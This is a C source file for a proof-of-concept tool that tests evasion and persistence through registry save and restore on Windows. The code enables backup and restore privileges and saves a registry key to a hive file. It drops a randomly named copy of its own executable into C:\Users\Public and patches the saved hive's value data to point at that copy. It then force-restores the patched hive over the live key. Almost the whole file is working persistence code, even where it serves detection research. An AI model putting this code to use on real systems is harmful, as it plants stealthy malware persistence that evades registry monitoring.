/**********************************************
* Author: Teoderick Contreras [tccontre18 - Br3akp0int]
*
* Description: This POC tool is designed to test the evasion and persistence
*              using reg restore function
*
*
***********************************************/

#include "stdafx.h"
#include "registrydbparser.h"

struct REGF_HEADER REGF_HDR;
struct HIVE_BIN_HEADER HIVE_BIN_HDR;
struct CELL_FMT C_FMT;
struct SUBKEYLIST_SK SUBKEYLIST_SK_FMT;
struct SUBKEYLIST_VK SUBKEYLIST_VK_FMT;
struct NAMEDKEY_NK NAMEDKEY_NK_FMT;
BOOL DEBUG_HEX = FALSE;

/// <summary>
/// COLOR FOREGROUND CONSTANT
/// </summary>
const int WARN_FOREGROUND = 14;
const int BANNER_FOREGROUND = 11;
const int HEX_FOREGROUND = 14;
const int RESTORE_FOREGROUND = 10;
const int WRITE_FOREGROUND = 12;
const int TEXT_FOREGROUND = 14;
const int SUCCESS_FOREGROUND = 11;
const int ERROR_FOREGROUND = 12;


void ShowError(LPCSTR, HANDLE, WORD);
void InfoMsg(LPTSTR, HANDLE, WORD);
void MemHexDump(LPVOID, DWORD, HANDLE, WORD, int);
VOID AdjustTokenPrivileges(LPCWSTR, HANDLE, WORD);
VOID SaveRegistryKey(HKEY, LPCWSTR, LPCWSTR, HANDLE, WORD);
void CloseHandleAndExit(HANDLE);
VOID ParseRegfStructure(HANDLE, HANDLE, WORD);
VOID ParseHbinHeader(HANDLE, HANDLE, WORD);
VOID ParseCellHeader(HANDLE, DWORD, HANDLE, WORD);
VOID ParseSubKeyRecord(HANDLE, DWORD, HANDLE, WORD);
VOID ParseNamedKeyRecord(HANDLE, DWORD, HANDLE, WORD);
VOID ParseValueKeyRecord(HANDLE, DWORD, HANDLE, WORD);
VOID ParseAndModifyRegistryHeader(LPCWSTR lpszaveKeyFilePath, HKEY, LPCWSTR, HANDLE, WORD);
LPWSTR ParseValueDataString(HANDLE, DWORD, HANDLE, WORD);
CHAR* GenerateRandomFileName(int, int, int);
VOID DropCopyOfItself(char*, int, HANDLE, WORD);
VOID RestoreSavedRegistryHive(HKEY, LPCWSTR, LPCWSTR, HANDLE, WORD);
VOID ModifyRegSaveData(LPCWSTR, CHAR*, DWORD, int, HANDLE, WORD);


LPCWSTR lpszModSaveRegFile = L"mod_save_reg.hive";
/*************************************************
* Utility Function
**************************************************/

void CloseHandleAndExit(HANDLE fh)
{
    CloseHandle(fh);
    ExitProcess(1);
}

void ShowError(LPCSTR lpszFunction, HANDLE hConsole, WORD wOriginalAttributes)
{
    // Retrieve the system error message for the last-error code

    LPWSTR lpMsgBuf;
    DWORD dw = GetLastError();

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf,
        0, NULL);

    // Display the error message and exit the process
    if (dw > 0)
    {
        SetConsoleTextAttribute(hConsole, ERROR_FOREGROUND);
        printf("[-] STATUS: [FAILED]--[%s:%s]--[FUNC: %s]--[LINE_NUMBER: %d]--> with error %d: %ws \n", __DATE__, __TIME__, lpszFunction, __LINE__, dw, lpMsgBuf);
        LocalFree(lpMsgBuf);
        SetConsoleTextAttribute(hConsole, wOriginalAttributes);
    }
}

void MemHexDump(LPVOID MemData, DWORD DataSize, HANDLE hConsole, WORD wOriginalAttributes, int iForeground)
{
    DWORD dwfd;
    dwfd = _setmode(_fileno(stdout), _O_WTEXT);
    if (dwfd == -1)
    {
        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
    }
    SetConsoleTextAttribute(hConsole, iForeground);
    DWORD ofs = 0x00;
    wprintf(L"╔════════════╗╔═══════════════════════[DUMPHEX]══════════════════════════════════════════╗\n");
    wprintf(L"║ OFFSET     ║ 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f                           ║\n");
    wprintf(L"╔════════════╝╚══════════════════════════════════════════════════════════════════════════╗\n");
    wprintf(L"║0x%08x  ║║ ", ofs);

    char asciiValue[17] = "\0";
    int i, j;
    for (i = 0; i < DataSize; i++)
    {
        //check if the hex dump is in printing ascii value
        if (i > 0 && (i % 0x10 == 0))
        {
            wprintf(L"║ ");
            for (j = 0; j <= 0x10; j++)
            {
                wprintf(L"%c", asciiValue[j]);
            }
            wprintf(L"      ║\n");
            wprintf(L"║0x%08x  ║║ ", i);
        }
        wprintf(L"%02X ", ((unsigned char*)MemData)[i]);


        if (((unsigned char*)MemData)[i] != 0x0a && ((unsigned char*)MemData)[i] != 0x0d)
        {
            asciiValue[i % 16] = ((unsigned char*)MemData)[i];
        }
        else
        {
            asciiValue[i % 16] = ' ';
        }
    }

    //print ascii value if the 16 bytes is not completed

    if (DataSize < 0x10 || DataSize % 0x10 != 0)
    {
        int paddingSpace = 0x10 - (DataSize % 0x10);

        for (j = 0; j < paddingSpace; j++)
        {
            wprintf(L"?? ");
        }
        wprintf(L"║ ");
        int indexPtr = DataSize - (DataSize % 0x10);
        for (j = indexPtr; j <= DataSize; j++)
        {
            wprintf(L"%c", ((unsigned char*)MemData)[j]);
        }

        for (j = 0; j < paddingSpace; j++)
        {
            wprintf(L" ");
        }
        wprintf(L"      ║\n");
        wprintf(L"║0x%08x  ║║ ", i);
    }

    wprintf(L"\n");
    wprintf(L"╚════════════╝╚═══════════════════════[DUMPHEX]══════════════════════════════════════════╝\n\n");

    SetConsoleTextAttribute(hConsole, wOriginalAttributes);
    int fd = _setmode(_fileno(stdout), dwfd);
    if (fd == -1)
    {
        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
    }
}

void InfoMsg(LPCTSTR Msg, HANDLE hConsole, WORD wOriginalAttributes)
{
    SetConsoleTextAttribute(hConsole, SUCCESS_FOREGROUND);
    printf("[+] [SUCCESS]:[TASK] [->] %ws\n", Msg);
    SetConsoleTextAttribute(hConsole, wOriginalAttributes);
}

LPWSTR* GetCommandLineParameter(HANDLE hConsole, WORD wOriginalAttributes)
{
    LPWSTR* lpszArgList;
    int i, iArgc = 0;

    lpszArgList = CommandLineToArgvW(GetCommandLineW(), &iArgc);
    if (NULL == lpszArgList)
    {
        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
        return NULL;
    }
    else
    {
        for (i = 0; i < iArgc; i++)
        {
            printf("parameter %d: %ws\n", i, lpszArgList[i]);
        }

        return lpszArgList;
    }
}

VOID AdjustTokenPrivileges(LPCWSTR lpszPrivilege, HANDLE hConsole, WORD wOriginalAttributes)
{
    HANDLE TokenHandle = 0;
    HANDLE hproc = GetCurrentProcess();
    LPCWSTR lpSystemName = NULL;
    WCHAR wFormatStr[100] = {0};
    LUID luid = { 0 };
    if (OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle))
    {
        if (LookupPrivilegeValueW(lpSystemName, lpszPrivilege, &luid))
        {
            TOKEN_PRIVILEGES tokenPriv = { 0 };
            tokenPriv.PrivilegeCount = 1;
            tokenPriv.Privileges[0].Luid = luid;
            tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            BOOL bret = AdjustTokenPrivileges(TokenHandle, 0, &tokenPriv, 0, 0, 0);
            if (bret)
            {
                SetConsoleTextAttribute(hConsole, SUCCESS_FOREGROUND);
                printf("[+] [SUCCESS]:[TASK] [->] Token Privileges Adjusted: %ws\n", lpszPrivilege);
                SetConsoleTextAttribute(hConsole, wOriginalAttributes);

            }
            else
                ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
        }
        else
            ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
        CloseHandle(TokenHandle);
    }
    else
        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
    return;
}

VOID SaveRegistryKey(HKEY hkey, LPCWSTR lpszSubKey, LPCWSTR lpszSaveKeyFilePath, HANDLE hConsole, WORD wOriginalAttributes)
{
    HKEY hkResult = 0;
    if (RegOpenKeyExW(hkey, lpszSubKey, 0, KEY_READ, &hkResult))
    {
        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
    }
    else
    {
        LPCWSTR lpszBackup = L"SeBackupPrivilege";
        AdjustTokenPrivileges(lpszBackup, hConsole, wOriginalAttributes);
        LSTATUS result = RegSaveKeyExW(hkResult, lpszSaveKeyFilePath, 0, REG_LATEST_FORMAT);
        if (ERROR_INVALID_PARAMETER == result || ERROR_ALREADY_EXISTS == result)
        {
            DeleteFileW(lpszSaveKeyFilePath);
            LSTATUS lResult = RegSaveKeyExW(hkResult, lpszSaveKeyFilePath, 0, REG_LATEST_FORMAT);
            if (lResult == ERROR_SUCCESS)
            {

                InfoMsg(L"Registry Hive Saved ..", hConsole, wOriginalAttributes);
                SetConsoleTextAttribute(hConsole, TEXT_FOREGROUND);
                wprintf(L"[+] [SUCCESS]:[REGSAVE]\n\t [->] HKEY                     : %08x\n\t [->] SUBKEY                   : %ws\n\t [->] SavedRegistryHiveFilePath: %ws\n", hkey, lpszSubKey, lpszSaveKeyFilePath);

                RegCloseKey(hkResult);
            }
        }
        else
        {
            InfoMsg(L"Registry Hive Saved ..", hConsole, wOriginalAttributes);
            SetConsoleTextAttribute(hConsole, TEXT_FOREGROUND);
            wprintf(L"[+] [SUCCESS]:[REGSAVE]\n\t [->] HKEY                     : %08x\n\t [->] SUBKEY                   : %ws\n\t [->] SavedRegistryHiveFilePath: %ws\n", hkey, lpszSubKey, lpszSaveKeyFilePath);
            RegCloseKey(hkResult);
        }
    }
    SetConsoleTextAttribute(hConsole, wOriginalAttributes);
    //copy for modificationb of registry hive data

    if (CopyFileW(lpszSaveKeyFilePath, lpszModSaveRegFile, FALSE))
        InfoMsg(L"Registry Hive Copied ..", hConsole, wOriginalAttributes);
    else
    {
        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
    }
    return;
}


VOID ShowNAMEDKEYStruct(HANDLE hConsole, WORD wOriginalAttributes)
{
    SetConsoleTextAttribute(hConsole, RESTORE_FOREGROUND);

    SetConsoleTextAttribute(hConsole, wOriginalAttributes);

}


/**
* Parsing Registry Hive Header
**/
VOID ParseRegfStructure(HANDLE fh, HANDLE hConsole, WORD wOriginalAttributes)
{
    DWORD lpNumberOfBytesRead = 0;
    if (ReadFile(fh, &REGF_HDR, sizeof(REGF_HEADER), &lpNumberOfBytesRead, NULL))
    {
        InfoMsg(L"REGF_HEADER Parsed..", hConsole, wOriginalAttributes);
        if (DEBUG_HEX)
            MemHexDump(&REGF_HDR, sizeof(REGF_HEADER), hConsole, wOriginalAttributes, HEX_FOREGROUND);
    }
    else
    {
        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
        CloseHandleAndExit(fh);

    }

}

VOID ParseHbinHeader(HANDLE fh, HANDLE hConsole, WORD wOriginalAttributes)
{
    DWORD lpNumberOfBytesRead = 0;
    if (SetFilePointer(fh, REGF_HDR.dwHiveBinDataSize, 0, FILE_BEGIN))
    {
        if (ReadFile(fh, &HIVE_BIN_HDR, sizeof(HIVE_BIN_HEADER), &lpNumberOfBytesRead, NULL))
        {
            InfoMsg(L"HBIN_HEADER Parsed..", hConsole, wOriginalAttributes);
            if (DEBUG_HEX)
                MemHexDump(&HIVE_BIN_HDR, sizeof(HIVE_BIN_HEADER), hConsole, wOriginalAttributes, HEX_FOREGROUND);
        }
        else
        {
            ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
            CloseHandleAndExit(fh);

        }
    }
    else
    {
        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
        CloseHandleAndExit(fh);

    }

}

VOID ParseCellHeader(HANDLE fh, DWORD dwCellFileOffset, HANDLE hConsole, WORD wOriginalAttributes)
{
    DWORD lpNumberOfBytesRead = 0;
    if (SetFilePointer(fh, dwCellFileOffset, 0, FILE_BEGIN))
    {
        if (ReadFile(fh, &C_FMT, sizeof(CELL_FMT), &lpNumberOfBytesRead, NULL))
        {
            InfoMsg(L"CELL_HEADER Parsed..", hConsole, wOriginalAttributes);
            if (DEBUG_HEX)
                MemHexDump(&C_FMT, sizeof(CELL_FMT), hConsole, wOriginalAttributes, HEX_FOREGROUND);
        }
        else
        {
            ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
            CloseHandleAndExit(fh);

        }
    }
    else
    {
        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
        CloseHandleAndExit(fh);

    }

}

VOID ParseSubKeyRecord(HANDLE fh, DWORD dwRecordFileOffset, HANDLE hConsole, WORD wOriginalAttributes)
{
    DWORD lpNumberOfBytesRead = 0;
    if (SetFilePointer(fh, dwRecordFileOffset, 0, FILE_BEGIN))
    {
        if (ReadFile(fh, &SUBKEYLIST_SK_FMT, sizeof(SUBKEYLIST_SK), &lpNumberOfBytesRead, NULL))
        {
            InfoMsg(L"SUBKEY_RECORD Parsed..", hConsole, wOriginalAttributes);
            if (DEBUG_HEX)
                MemHexDump(&SUBKEYLIST_SK_FMT, sizeof(SUBKEYLIST_SK), hConsole, wOriginalAttributes, HEX_FOREGROUND);
        }
        else
        {
            ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
            CloseHandleAndExit(fh);

        }
    }
    else
    {
        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
        CloseHandleAndExit(fh);

    }
}

VOID ParseNamedKeyRecord(HANDLE fh, DWORD dwRecordFileOffset, HANDLE hConsole, WORD wOriginalAttributes)
{
    DWORD lpNumberOfBytesRead = 0;
    CONST INT MAX_NAMED_KEY_STR_LEN = 0x50;
    char szNameKey[MAX_NAMED_KEY_STR_LEN] = { 0 };
    if (SetFilePointer(fh, dwRecordFileOffset, 0, FILE_BEGIN))
    {
        if (ReadFile(fh, &NAMEDKEY_NK_FMT, sizeof(NAMEDKEY_NK), &lpNumberOfBytesRead, NULL))
        {
            InfoMsg(L"NAMEDKEY_RECORD Parsed..", hConsole, wOriginalAttributes);
            if (DEBUG_HEX)
                MemHexDump(&NAMEDKEY_NK_FMT, sizeof(NAMEDKEY_NK), hConsole, wOriginalAttributes, HEX_FOREGROUND);
            //parse registry named key string
            if (MAX_NAMED_KEY_STR_LEN > NAMEDKEY_NK_FMT.wKeyNameSize)
            {
                if (ReadFile(fh, szNameKey, MAX_NAMED_KEY_STR_LEN, &lpNumberOfBytesRead, NULL))
                {
                    SetConsoleTextAttribute(hConsole, SUCCESS_FOREGROUND);
                    printf("[+] [SUCCESS]:[TASK] [->] Registry NamedKey String: %s\n", szNameKey);
                    SetConsoleTextAttribute(hConsole, wOriginalAttributes);
                }
                else
                {
                    SetConsoleTextAttribute(hConsole, ERROR_FOREGROUND);
                    printf("[+] STATUS: [FAILED] --> NAMEDKEY string length is too big..\n");
                    SetConsoleTextAttribute(hConsole, wOriginalAttributes);
                }

            }
        }
        else
        {
            ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
            CloseHandleAndExit(fh);

        }
    }
    else
    {
        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
        CloseHandleAndExit(fh);

    }

}

VOID ParseValueKeyRecord(HANDLE fh, DWORD dwRecordFileOffset, HANDLE hConsole, WORD wOriginalAttributes)
{
    DWORD lpNumberOfBytesRead = 0;
    if (SetFilePointer(fh, dwRecordFileOffset, 0, FILE_BEGIN))
    {
        if (ReadFile(fh, &SUBKEYLIST_VK_FMT, sizeof(SUBKEYLIST_VK), &lpNumberOfBytesRead, NULL))
        {
            InfoMsg(L"VALUE_KEY_RECORD Parsed..", hConsole, wOriginalAttributes);
            if (DEBUG_HEX)
                MemHexDump(&SUBKEYLIST_VK_FMT, sizeof(SUBKEYLIST_VK), hConsole, wOriginalAttributes, HEX_FOREGROUND);
        }
        else
        {
            ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
            CloseHandleAndExit(fh);

        }
    }



}

LPWSTR ParseValueDataString(HANDLE fh, DWORD dwRecordFileOffset, HANDLE hConsole, WORD wOriginalAttributes)
{
    BYTE szDataStrValue[256];
    DWORD lpNumberOfBytesRead = 0;
    if (SetFilePointer(fh, dwRecordFileOffset, 0, FILE_BEGIN))
    {
        if (ReadFile(fh, szDataStrValue, SUBKEYLIST_VK_FMT.dwDataSize, &lpNumberOfBytesRead, NULL))
        {

            InfoMsg(L"Registry Value Data String Parsed..", hConsole, wOriginalAttributes);

            SetConsoleTextAttribute(hConsole, TEXT_FOREGROUND);
            wprintf(L"[+] [SUCCESS]:[REG-PARSING]\n");
            wprintf(L"\t [->] ");
            for (int x = 0; x < lpNumberOfBytesRead; x += 2)
            {
                wprintf(L"%c", szDataStrValue[x]);
            }
            wprintf(L"\n");
            wprintf(L"\t [->] Value Data String Length       : %d\n", SUBKEYLIST_VK_FMT.dwDataSize);
            SetConsoleTextAttribute(hConsole, wOriginalAttributes);
        }
        else
        {
            ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
        }
    }
    else
    {
        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
    }

    return (LPWSTR)szDataStrValue;
}

CHAR* GenerateRandomFileName(int iWideFileNameLen, int nFilePathLen, int nFileExtLen)
{
    static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    char* cRandomString = NULL;


    int iRandomStringLen = (iWideFileNameLen / 2);
    if (iRandomStringLen > nFilePathLen + nFileExtLen)
    {
        int nRandomStrLenNeeded = iRandomStringLen - nFilePathLen - nFileExtLen;

        cRandomString = (char*)malloc(sizeof(char) * (nRandomStrLenNeeded + 1));

        if (cRandomString)
        {
            srand(time(0));

            for (int n = 0; n < nRandomStrLenNeeded; n++)
            {
                int k = rand() % (int)(sizeof(charset) - 1);
                cRandomString[n] = charset[k];
            }
            cRandomString[nRandomStrLenNeeded] = '\0';
        }

    }

    return cRandomString;
}

VOID DropCopyOfItself(char* szFullPathName, int dwDataSize, HANDLE hConsole, WORD wOriginalAttributes)
{
    const char szFileExt[] = ".exe";
    const char szFilePath[] = "C:\\Users\\Public\\";
    char* cRandomStringGen = NULL;
    CHAR szProcessPath[256] = { 0 };

    int nFilePathLen = strlen(szFilePath);
    int nFileExtLen = strlen(szFileExt);

    cRandomStringGen = GenerateRandomFileName(SUBKEYLIST_VK_FMT.dwDataSize, nFilePathLen, nFileExtLen);
    if (NULL == cRandomStringGen)
    {
        SetConsoleTextAttribute(hConsole, ERROR_FOREGROUND);
        printf("[-] [FAILED]:[TASK] [->] No enough space for generated file path of copy of itself for registry value data\n");
        SetConsoleTextAttribute(hConsole, wOriginalAttributes);
    }
    if (lstrcatA(szFullPathName, szFilePath))
    {
        if (NULL != cRandomStringGen && lstrcatA(szFullPathName, cRandomStringGen))
        {
            lstrcatA(szFullPathName, szFileExt);
            SetConsoleTextAttribute(hConsole, TEXT_FOREGROUND);
            printf("\t [->] Copy Of Itself File path       : %s\n", szFullPathName);
            printf("\t [->] Copy Of Itself File path Length: %d\n", (int)strlen(szFullPathName));
            SetConsoleTextAttribute(hConsole, wOriginalAttributes);

            WCHAR wszFullFilePath[256] = { 0 };
            int convertResult = MultiByteToWideChar(CP_UTF8, 0, szFullPathName, (int)strlen(szFullPathName), NULL, 0);
            if (convertResult <= 0)
            {

                ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
            }
            else
            {
                int nConvertedStrLen = MultiByteToWideChar(CP_UTF8, 0, szFullPathName, (int)strlen(szFullPathName), wszFullFilePath, convertResult + 10);
                if (nConvertedStrLen > 0)
                {
                    InfoMsg(L"Multi Bytes String to Wide String...", hConsole, wOriginalAttributes);

                    int nProcessPathLen = GetModuleFileNameA(NULL, szProcessPath, sizeof(szProcessPath));

                    if (CopyFileA(szProcessPath, szFullPathName, FALSE))
                        InfoMsg(L"Dropped Copy of Itself..", hConsole, wOriginalAttributes);
                    else
                    {
                        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
                    }
                }
            }
        }
    }


}

VOID RestoreSavedRegistryHive(HKEY hkey, LPCWSTR lpszSubKey, LPCWSTR lpszSaveKeyFilePath, HANDLE hConsole, WORD wOriginalAttributes)
{
    HKEY hkResult = 0;
    if (RegOpenKeyExW(hkey, lpszSubKey, 0, KEY_READ, &hkResult))
    {
        wprintf(L"[-] [FAILED]:[TASK] [->] Openning Registry.\n");

    }
    else
    {
        LPCWSTR lpszSeRestore = L"SeRestorePrivilege";
        AdjustTokenPrivileges(lpszSeRestore, hConsole, wOriginalAttributes);
        RegRestoreKeyW(hkResult, lpszSaveKeyFilePath, REG_FORCE_RESTORE);
        RegCloseKey(hkResult);
        InfoMsg(L"Modified Reg Hive Data Restored...", hConsole, wOriginalAttributes);

    }
    return;
}

VOID ModifyRegSaveData(LPCWSTR lpszSaveKeyFilePath, CHAR* szFullPathName, DWORD dwDataValueOffset, int nValueDataSize, HANDLE hConsole, WORD wOriginalAttributes)
{
    WCHAR wszFullPathName[256] = { 0 };
    DWORD nNumberOfBytesWritten = 0;
    int nConvertedStrLen = MultiByteToWideChar(CP_UTF8, 0, szFullPathName, (int)strlen(szFullPathName), wszFullPathName, 256);
    if (nConvertedStrLen)
    {
        HANDLE fh = CreateFile(lpszSaveKeyFilePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (fh != INVALID_HANDLE_VALUE)
        {
            if (SetFilePointer(fh, dwDataValueOffset, 0, FILE_BEGIN))
            {
                WriteFile(fh, wszFullPathName, nValueDataSize, &nNumberOfBytesWritten, 0);
                InfoMsg(L"Reg Hive Data was Modified...", hConsole, wOriginalAttributes);
            }

            CloseHandle(fh);
        }
        else
            ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
    }
    else
        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);

}

VOID ParseAndModifyRegistryHeader(LPCWSTR lpszSaveKeyFilePath, HKEY hkey, LPCWSTR lpszSubKey, HANDLE hConsole, WORD wOriginalAttributes)
{
    /**
    description: parsing the saved registry hive structure
                 parse only the needed one

                 - RegfHeader
                 - HiveBinHeader
                 - Cell
                 - SubkeyList (vk)
                 - NamedKey (nk)

     **/
    LPWSTR szDataStrValue = NULL;
    HANDLE fh = CreateFile(lpszSaveKeyFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fh != INVALID_HANDLE_VALUE)
    {

        DWORD dwCellSizeRawAndHeaderLen = 6;
        DWORD dwCellSizeRaw = 4;

        //start parsing the saved registry hive data
        SetConsoleTextAttribute(hConsole, TEXT_FOREGROUND);
        wprintf(L"\n[+] [SUCCESS]:[REG-PARSING] [->] Parsing Registry Hive Structure..\n");
        wprintf(L"[+] [-START-]:------------------------------------------------>\n\n");
        SetConsoleTextAttribute(hConsole, wOriginalAttributes);

        //parse REGF_HEADER
        ParseRegfStructure(fh, hConsole, wOriginalAttributes);

        //parse HIVE_BIN_HEADER
        ParseHbinHeader(fh, hConsole, wOriginalAttributes);

        //parse the first CELL_HEADER
        DWORD dwRootKeyOffset = REGF_HDR.dwHiveBinDataSize + REGF_HDR.dwRootKeyOffset;
        ParseCellHeader(fh, dwRootKeyOffset, hConsole, wOriginalAttributes);

        //look for namedKey cell record
        if (C_FMT.wCellTypeIdentifier == 0x6b6e)
        {
            //parse NAMEDKEY_NK_RECORD
            InfoMsg(L"NAMEDKEY_HEADER RECORD FOUND", hConsole, wOriginalAttributes);
            DWORD dwNamedKeyOffset = dwRootKeyOffset + dwCellSizeRawAndHeaderLen; // sizeof(CELL_FMT) == 6 bytes
            ParseNamedKeyRecord(fh, dwNamedKeyOffset, hConsole, wOriginalAttributes);

            //check the namedkey value count
            if (NAMEDKEY_NK_FMT.dwValueCount <= 0)
            {
                SetConsoleTextAttribute(hConsole, ERROR_FOREGROUND);
                printf("[[-] [FAILED]:[TASK] [->] NAMEDKEY Value Count is Empty\n");
                SetConsoleTextAttribute(hConsole, wOriginalAttributes);
                CloseHandleAndExit(fh);
            }

            //parse subkey
            if (NAMEDKEY_NK_FMT.dwSecurityKeyOffset != 0xFFFFFFFF) //not deleted sub key
            {
                DWORD dwSkRecordOffset = NAMEDKEY_NK_FMT.dwSecurityKeyOffset + REGF_HDR.dwHiveBinDataSize;
                ParseCellHeader(fh, dwSkRecordOffset, hConsole, wOriginalAttributes);

                //SK cell header
                if (C_FMT.wCellTypeIdentifier == 0x6b73)
                {
                    DWORD dwSkRecordOffset = NAMEDKEY_NK_FMT.dwSecurityKeyOffset + REGF_HDR.dwHiveBinDataSize + dwCellSizeRawAndHeaderLen;
                    ParseSubKeyRecord(fh, dwSkRecordOffset, hConsole, wOriginalAttributes);
                }

                //parsing value cell record

                DWORD lpNumberOfBytesRead = 0;
                DWORD dwValueCellOffset = 0;


                //iterate to all value key list pointer
                for (int ctr = 0; ctr < NAMEDKEY_NK_FMT.dwValueCount; ctr++)
                {
                    DWORD dwValueCellPtr = REGF_HDR.dwHiveBinDataSize + NAMEDKEY_NK_FMT.dwValuesListOffset + dwCellSizeRaw + (ctr * 4);

                    if (SetFilePointer(fh, dwValueCellPtr, 0, FILE_BEGIN))
                    {
                        //read value key ptr offset in the list
                        if (ReadFile(fh, &dwValueCellOffset, 4, &lpNumberOfBytesRead, NULL))
                        {
                            //go to the value key header record
                            ParseCellHeader(fh, REGF_HDR.dwHiveBinDataSize + dwValueCellOffset, hConsole, wOriginalAttributes);
                            if (C_FMT.wCellTypeIdentifier == 0x6b76)
                            {
                                ParseValueKeyRecord(fh, REGF_HDR.dwHiveBinDataSize + dwValueCellOffset + dwCellSizeRawAndHeaderLen, hConsole, wOriginalAttributes);

                                //parse the value key data string
                                DWORD dwDataValueOffset = SUBKEYLIST_VK_FMT.dwDataOffset + REGF_HDR.dwHiveBinDataSize + dwCellSizeRaw;
                                szDataStrValue = ParseValueDataString(fh, dwDataValueOffset, hConsole, wOriginalAttributes);

                                //Drop copy of itself
                                char szFullPathName[256] = { 0 };
                                DropCopyOfItself(szFullPathName, SUBKEYLIST_VK_FMT.dwDataSize, hConsole, wOriginalAttributes);

                                ModifyRegSaveData(lpszModSaveRegFile, szFullPathName, dwDataValueOffset, SUBKEYLIST_VK_FMT.dwDataSize, hConsole, wOriginalAttributes);

                            }
                        }
                    }
                    else
                    {
                        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
                        CloseHandleAndExit(fh);
                    }

                }
                CloseHandle(fh);
                //restore reg
                RestoreSavedRegistryHive(hkey, lpszSubKey, lpszModSaveRegFile, hConsole, wOriginalAttributes);
            }

        }

        else
        {
            SetConsoleTextAttribute(hConsole, ERROR_FOREGROUND);
            printf("[-] [FAILED]:[TASK] [->] NAMEDKEY Not Found in Registry Hive\n");
            SetConsoleTextAttribute(hConsole, wOriginalAttributes);
            CloseHandleAndExit(fh);
        }


    }
    else
    {
        ShowError(__FUNCTION__, hConsole, wOriginalAttributes);
    }
    return;
}
